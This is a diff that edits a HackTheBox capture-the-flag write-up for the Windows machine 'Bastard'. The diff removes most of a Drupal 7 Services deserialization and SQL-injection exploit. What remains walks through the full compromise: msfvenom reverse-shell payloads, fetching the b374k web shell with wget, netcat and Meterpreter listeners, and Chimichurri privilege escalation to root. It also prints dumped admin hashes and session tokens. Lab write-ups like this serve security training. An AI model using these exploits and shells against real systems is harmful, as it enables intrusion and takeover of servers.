@@ -1,11 +1,11 @@
-This is a write up for the machine Bastard from HackTheBox.eu
+# This is a write up for the machine Bastard from HackTheBox.eu
 
 host: 10.10.10.9
 
 Service Discovery
 
 $ nmap -A 10.10.10.9
-
+```
 Starting Nmap 7.01 ( https://nmap.org ) at 2017–09–10 01:32 EDT
 Nmap scan report for 10.10.10.9
 Host is up (0.13s latency).
@@ -25,10 +25,9 @@ PORT STATE SERVICE VERSION
 135/tcp open msrpc Microsoft Windows RPC
 49154/tcp open msrpc Microsoft Windows RPC
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-When we access the web server were brought to a Drupal login page
-Let’s do some reconnaissance with DirBuster
-
+```
+When we access the web server were brought to a Drupal login page... Let’s do some reconnaissance with DirBuster
+```
 File found: /modules — 301
 File found: /misc — 301
 File found: /themes — 301
@@ -52,9 +51,10 @@ ERROR: http://10.10.10.9:80/rest/user/ — Return code for first HEAD, is differ
 Dir found: /rest/user/ — 200
 Dir found: /rest/comment/ — 200
 Dir found: /rest/node/ — 200
+```
 
-More Enumeration
-
+More Enumeration...
+```
 $ nikto -h 10.10.10.9
 - Nikto v2.1.5
  — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -
@@ -103,13 +103,14 @@ $ nikto -h 10.10.10.9
 + OSVDB-3092: /README.TXT: This might be interesting…
 + OSVDB-3092: /readme.txt: This might be interesting…
 + OSVDB-3092: /user/: This might be interesting…
+```
 
-We can see that the web server is running Drupal 7 and it is vulnerable to several to XSS and possibly SQL Injection. I started looking for a Drupal 7 exploit and I came across https://www.ambionics.io/blog/drupal-services-module-rce
+We can see that the web server is running Drupal 7 and it is vulnerable to several to XSS and possibly SQL Injection. I started looking to see if there were any Drupal exploits and I came across this https://www.ambionics.io/blog/drupal-services-module-rce
 
-They explain in depth the code of the exploit in the link above. I suggest to read it even if you’re not doing the CTF.
+They explain in depth what the exploit does and how it works in the link above. I suggest to read it even if you’re not doing the CTF, it's a good resource to have in your infosec arsenal.
 
-I named this file drupal.php
-
+I had to modify the exploit a little to do what I wanted it to do
+```
 #!/usr/bin/php
 
 <?php
@@ -123,491 +124,31 @@ I named this file drupal.php
 # along with admin credentials and hash
 # 2. Alter the cache to allow us to write a file and do so
 # 3. Restore the cache
- 
 # Initialization
 
 error_reporting(E_ALL);
-
 define(‘QID’, ‘anything’);
-
 define(‘TYPE_PHP’, ‘application/vnd.php.serialized’);
-
 define(‘TYPE_JSON’, ‘application/json’);
-
 define(‘CONTROLLER’, ‘user’);
-
 define(‘ACTION’, ‘login’);
-
 $myfile = fopen(“payload1.txt”, “r”) or die(“Unable to open file!”);
-
 $payload1 = fread($myfile,filesize(“payload1.txt”));
-
 $url = ‘10.10.10.9’;
-
 $endpoint_path = ‘/rest’;
-
 $endpoint = ‘rest_endpoint’;
-
 $file = [
-
 ‘filename’ => ‘troll.php’,
-
-‘data’ => $payload1
-
-];
+‘data’ => $payload1];
 
 $browser = new Browser($url . $endpoint_path);
-
-# Stage 1: SQL Injection
-
-class DatabaseCondition
-
-{
-
-protected $conditions = [
-
-“#conjunction” => “AND”
-
-];
-
-protected $arguments = [];
-
-protected $changed = false;
-
-protected $queryPlaceholderIdentifier = null;
-
-public $stringVersion = null;
-
-public function __construct($stringVersion=null)
-
-{
-
-$this->stringVersion = $stringVersion;
-
-if(!isset($stringVersion))
-
-{
-
-$this->changed = true;
-
-$this->stringVersion = null;
-
-}
-
-}
-
-}
-
-class SelectQueryExtender {
-
-# Contains a DatabaseCondition object instead of a SelectQueryInterface
-
-# so that $query->compile() exists and (string) $query is controlled by us.
-
-protected $query = null;
-
-protected $uniqueIdentifier = QID;
-
-protected $connection;
-
-protected $placeholder = 0;
-
-public function __construct($sql)
-
-{
-
-$this->query = new DatabaseCondition($sql);
-
-}
-
-}
-
-$cache_id = “services:$endpoint:resources”;
-
-$sql_cache = “SELECT data FROM {cache} WHERE cid=’$cache_id’”;
-
-$password_hash = ‘$S$D2NH.6IZNb1vbZEV1F0S9fqIz3A0Y1xueKznB8vWrMsnV/nrTpnd’;
-
-# Take first user but with a custom password
-
-# Store the original password hash in signature_format, and endpoint cache
-
-# in signature
-
-$query =
-
-“0x3a) UNION SELECT ux.uid AS uid, “ .
-
-“ux.name AS name, ‘$password_hash’ AS pass, “ .
-
-“ux.mail AS mail, ux.theme AS theme, ($sql_cache) AS signature, “ .
-
-“ux.pass AS signature_format, ux.created AS created, “ .
-
-“ux.access AS access, ux.login AS login, ux.status AS status, “ .
-
-“ux.timezone AS timezone, ux.language AS language, ux.picture “ .
-
-“AS picture, ux.init AS init, ux.data AS data FROM {users} ux “ .
-
-“WHERE ux.uid<>(0”
-
-;
-
-$query = new SelectQueryExtender($query);
-
-$data = [‘username’ => $query, ‘password’ => ‘ouvreboite’];
-
-$data = serialize($data);
-
-$json = $browser->post(TYPE_PHP, $data);
-
-# If this worked, the rest will as well
-
-if(!isset($json->user))
-
-{
-
-print_r($json);
-
-e(“Failed to login with fake password”);
-}
-
-# Store session and user data
-
-$session = [
-
-‘session_name’ => $json->session_name,
-
-‘session_id’ => $json->sessid,
-
-‘token’ => $json->token
-];
-
-store(‘session’, $session);
-
-$user = $json->user;
-
-# Unserialize the cached value
-# Note: Drupal websites admins, this is your opportunity to fight back :)
-$cache = unserialize($user->signature);
-
-# Reassign fields
-
-$user->pass = $user->signature_format;
-
-unset($user->signature);
-
-unset($user->signature_format);
-
-store(‘user’, $user);
-
-if($cache === false)
-
-{
-
-e(“Unable to obtains endpoint’s cache value”);
-
-}
-
-x(“Cache contains “ . sizeof($cache) . “ entries”);
-
-# Stage 2: Change endpoint’s behaviour to write a shell
-
-class DrupalCacheArray
-
-{
-
-# Cache ID
-
-protected $cid = “services:endpoint_name:resources”;
-
-# Name of the table to fetch data from.
-
-# Can also be used to SQL inject in DrupalDatabaseCache::getMultiple()
-
-protected $bin = ‘cache’;
-
-protected $keysToPersist = [];
-
-protected $storage = [];
-
-function __construct($storage, $endpoint, $controller, $action) {
-
-$settings = [
-
-‘services’ => [‘resource_api_version’ => ‘1.0’]
-
-];
-
-$this->cid = “services:$endpoint:resources”;
-
-# If no endpoint is given, just reset the original values
-
-if(isset($controller))
-
-{
-
-$storage[$controller][‘actions’][$action] = [
-
-‘help’ => ‘Writes data to a file’,
-
-# Callback function
-
-‘callback’ => ‘file_put_contents’,
-
-# This one does not accept “true” as Drupal does,
-
-# so we just go for a tautology
-
-‘access callback’ => ‘is_string’,
-
-‘access arguments’ => [‘a string’],
-
-# Arguments given through POST
-
-‘args’ => [
-
-0 => [
-
-‘name’ => ‘filename’,
-
-‘type’ => ‘string’,
-
-‘description’ => ‘Path to the file’,
-
-‘source’ => [‘data’ => ‘filename’],
-
-‘optional’ => false,
-
-],
-
-1 => [
-
-‘name’ => ‘data’,
-
-‘type’ => ‘string’,
-
-‘description’ => ‘The data to write’,
-
-‘source’ => [‘data’ => ‘data’],
-
-‘optional’ => false,
-
-],
-
-],
-
-‘file’ => [
-
-‘type’ => ‘inc’,
-
-‘module’ => ‘services’,
-
-‘name’ => ‘resources/user_resource’,
-
-],
-
-‘endpoint’ => $settings
-
-];
-
-$storage[$controller][‘endpoint’][‘actions’] += [
-
-$action => [
-
-‘enabled’ => 1,
-
-‘settings’ => $settings
-
-]
-
-];
-
-}
-
-$this->storage = $storage;
-
-$this->keysToPersist = array_fill_keys(array_keys($storage), true);
-
-}
-
-}
-
-class ThemeRegistry Extends DrupalCacheArray {
-
-protected $persistable;
-
-protected $completeRegistry;
-
-}
-
-cache_poison($endpoint, $cache);
-
-# Write the file
-
-$json = (array) $browser->post(TYPE_JSON, json_encode($file));
-
-# Stage 3: Restore endpoint’s behaviour
-
-cache_reset($endpoint, $cache);
-
-if(!(isset($json[0]) && $json[0] === strlen($file[‘data’])))
-
-{
-
-e(“Failed to write file.”);
-
-}
-
-$file_url = $url . ‘/’ . $file[‘filename’];
-
-x(“File written: $file_url”);
-
-# HTTP Browser
-
-class Browser
-
-{
-
-private $url;
-
-private $controller = CONTROLLER;
-
-private $action = ACTION;
-
-function __construct($url)
-
-{
-
-$this->url = $url;
-
-}
-
-function post($type, $data)
-
-{
-
-$headers = [
-
-“Accept: “ . TYPE_JSON,
-
-“Content-Type: $type”,
-
-“Content-Length: “ . strlen($data)
-
-];
-
-$url = $this->url . ‘/’ . $this->controller . ‘/’ . $this->action;
-
-$s = curl_init();
-
-curl_setopt($s, CURLOPT_URL, $url);
-
-curl_setopt($s, CURLOPT_HTTPHEADER, $headers);
-
-curl_setopt($s, CURLOPT_POST, 1);
-
-curl_setopt($s, CURLOPT_POSTFIELDS, $data);
-
-curl_setopt($s, CURLOPT_RETURNTRANSFER, true);
-
-curl_setopt($s, CURLOPT_SSL_VERIFYHOST, 0);
-
-curl_setopt($s, CURLOPT_SSL_VERIFYPEER, 0);
-
-$output = curl_exec($s);
-
-$error = curl_error($s);
-
-curl_close($s);
-
-if($error)
-
-{
-
-e(“cURL: $error”);
-
-}
-
-return json_decode($output);
-
-}
-
-}
-
-# Cache
-
-function cache_poison($endpoint, $cache)
-
-{
-
-$tr = new ThemeRegistry($cache, $endpoint, CONTROLLER, ACTION);
-
-cache_edit($tr);
-
-}
-
-function cache_reset($endpoint, $cache)
-
-{
-
-$tr = new ThemeRegistry($cache, $endpoint, null, null);
-
-cache_edit($tr);
-
-}
-
-function cache_edit($tr)
-
-{
-
-global $browser;
-
-$data = serialize([$tr]);
-
-$json = $browser->post(TYPE_PHP, $data);
-
-}
-
-# Utils
-
-function x($message)
-
-{
-
-print(“$message\n”);
-
-}
-
-function e($message)
-
-{
-
-x($message);
-
-exit(1);
-
-}
-
-function store($name, $data)
-
-{
-
-$filename = “$name.json”;
-
-file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
-
-x(“Stored $name information in $filename”);
-
-}
-
-The exploit needs a rest api path in the web server, one of the output from DirBuster was Dir found: /rest/ — 200
-
-So we can set the endpoint_path variable to $endpoint_path = ‘/rest’;
-once we run the the exploit we get two files user.json and session.json
-
-user.json
+```
+The code of the exploit is around 400 lines of code, I'm not going to paste all the code here just what I modified you can read it on their website. The exploit needs a rest api path in the web server, one of the output from DirBuster was Dir found: `/rest/ — 200`
+So we can set the endpoint_path variable to $endpoint_path = `‘/rest’;`once we run the the exploit we get two files 
+- user.json
+- session.json
+
+`user.json
 {
  “uid”: “1”,
  “name”: “admin”,
@@ -643,19 +184,19 @@ user.json
  }
  },
  “pass”: “$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE”
-}
+}``
 
-session.json
+``session.json
 
 {
  “session_name”: “SESSd873f26fc11f2b7e6e4aa0f6fce59913”,
  “session_id”: “xAmjIUH0wKeDr1QmfFsRWOs6QO_I-NpOEOkd-i3fVkU”,
  “token”: “s4iFtBwozCOf0rxIeloGaQ_KfOY1rGFOUpxNc2z5BH8”
 }
+`
+I modified the exploit so it would read from a file and that file contained my php reverse shell.
 
-I modified the exploit so it would read from a file that file will contain my php shell.
-
-$myfile = fopen(“payload1.txt”, “r”) or die(“Unable to open file!”);
+`$myfile = fopen(“payload1.txt”, “r”) or die(“Unable to open file!”);
 $payload1 = fread($myfile,filesize(“payload1.txt”));
 $url = ‘10.10.10.9’;
 $endpoint_path = ‘/rest’;
@@ -664,24 +205,22 @@ $endpoint = ‘rest_endpoint’;
  $file = [
  ‘filename’ => ‘ssec.php’,
  ‘data’ => $payload1
-];
-
+];``
+`
 I created a payload named payload1.txt and the contents of payload1.txt will be uploaded to the webserver as ssec.php
-
 msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=1234 -f raw > payload1.txt
+now when I run the drupal exploit the payload is written to the web server as a php shell and we can connect to the victims system.
 
-now when I run the drupal exploit the payload is written to the web server as a php shell.
-
-$ php drupal.php
+`$ php drupal.php
 
 Stored session information in session.json
 Stored user information in user.json
 Cache contains 7 entries
 File written: 10.10.10.9/ssec.php
-
+`
 Now I can catch the shell with netcat nc -lvp 1234
 
-Connection from [10.10.10.9] port 1234 [tcp/*] accepted (family 2, sport 49214)
+`Connection from [10.10.10.9] port 1234 [tcp/*] accepted (family 2, sport 49214)
 dir
  Volume in drive C has no label.
  Volume Serial Number is 605B-4AAA
@@ -698,23 +237,23 @@ cd C:\Users\dimitris\Desktop
  19/03/2017 09:06 �� 32 user.txt
  1 File(s) 32 bytes
  2 Dir(s) 31.040.098.304 bytes free
+`
+and we **Got The User Flag!**
 
-Got User Flag!
+> Note: when I was trying to catch the shell with metasploit, the session would die instantly I don’t know what was causing this so I moved on without metasploit and used nc instead.
 
-    Note: when I was trying to catch the shell with metasploit, the session would die instantly I don’t know what was causing this so I moved on without metasploit.
+I was trying to find a way to upload files to the machine so I can get a windows reverse shell but I couldn’t figure it out since the system didn't have python or netcat, so I used one of b374k’s php shell (2.7). https://raw.githubusercontent.com/BlackArch/webshells/master/php/b374k-2.7.php 
 
-I was trying to find a way to upload files to the machine so I can get a windows reverse shell but I couldn’t figure it out, so I used one of b374k’s php shell (2.7). https://raw.githubusercontent.com/BlackArch/webshells/master/php/b374k-2.7.php
-
-I download the file with wget
+I download the file
 
 wget -O payload1.txt https://raw.githubusercontent.com/BlackArch/webshells/master/php/b374k-2.7.php
 
-Now payload1.txt contains the content of the b374k’s shell so if we run php drupal.php again http://10.10.10.9/ssec.php should be a login page the password of all b374k shells is b374k
-unless you change it. Which I recommend you do to prevent other users from using your shell. I created and uploaded a windows shell through the upload function in b374k’s shell
+Now payload1.txt contains the content of the b374k’s shell so if we run php drupal.php once again http://10.10.10.9/ssec.php should be a login page to the shell. The password of all b374k shells is b374k unless you change it. Which I recommend you do to prevent other users from using your shell. I created and uploaded a windows shell through the upload function in b374k’s shell
+into a writeable directory. 
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.9 LPORT=4444 -f exe > ssec.exe
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.9 LPORT=4444 -f exe > ssec.exe`
 
-Directory of C:\inetpub\drupal-7.54
+`Directory of C:\inetpub\drupal-7.54
 
 10/09/2017 09:06 �� <DIR> .
 10/09/2017 09:06 �� <DIR> ..
@@ -750,7 +289,7 @@ Directory of C:\inetpub\drupal-7.54
 19/03/2017 01:42 �� 417 xmlrpc.php
  23 File(s) 348.601 bytes
  9 Dir(s) 31.039.807.488 bytes free
-
+`
 I prepared a metasploit handler to receive the incoming windows shell.
 
 use exploit/multi/handler
@@ -771,7 +310,7 @@ Domain : HTB
 Logged On Users : 0
 Meterpreter : x86/windows
 
-Now that we have a meterpreter shell we can use exploit suggester
+Now that we have a meterpreter shell we can use exploit suggester for possible privilege scalation on the windows box.  
 
 meterpreter > run post/multi/recon/local_exploit_suggester
 
@@ -787,22 +326,23 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 [+] 10.10.10.9 — exploit/windows/local/ms_ndproxy: The target service is running, but could not be validated.
 [+] 10.10.10.9 — exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
 
-We got quite a few exploits we could use but only one of them looks promising, ms16_032_secondary logon_handle_privesc. I tried it but it did not work.
-
+We got quite a few exploits we could use but only one of them looks promising, ms16_032_secondary logon_handle_privesc. 
+I tried it but that exploit only works if another user logged in as Administrator and in this case no one was logging in.
+`
 [*] Started reverse TCP handler on 10.10.x.x:4444 
- [*] Writing payload file, C:\Users\Public\Documents\test\XEfKVo.txt…
- [*] Compressing script contents…
- [+] Compressed size: 3588
- [*] Executing exploit script…
- [*] Exploit completed, but no session was created.
-
+[*] Writing payload file, C:\Users\Public\Documents\test\XEfKVo.txt…
+[*] Compressing script contents…
+[+] Compressed size: 3588
+[*] Executing exploit script…
+[*] Exploit completed, but no session was created.
+`
 I kept digging the inter-webs and came across this exploit on github https://github.com/Re4son/Chimichurri/
 
-Now that we have a meterpreter shell we can use the upload function built in metasploit. I uploaded Chimichurri.exe to C:\inetpub\drupal-7.54\
+Now that we have a meterpreter shell we can use the upload function built in metasploit. I uploaded Chimichurri.exe to `C:\inetpub\drupal-7.54\`
 
 Started a netcat listener on my host machine
 
-$ nc -lvp 5555
+`$ nc -lvp 5555
 Listening on [0.0.0.0] (family 0, port 5555)
 
 and on metasploit I ran Chimichurri.exe <my ip> 5555
@@ -821,7 +361,7 @@ Directory of C:\Users\Administrator\Desktop
 19/03/2017 08:34 �� 32 root.txt.txt
  1 File(s) 32 bytes
  2 Dir(s) 31.039.451.136 bytes free
-
-Got Root Flag!
-
+`
+and we Got The Root Flag!
+![](https://gph.is/2alsxtt)
 I really enjoyed this box but in some parts I was struggling that’s why I had to use b374k’s shell if someone else did it differently I would love to hear how you achieved to upload a file to the victim machine. I’m happy to announce that this my very first writeup I’ve ever done.
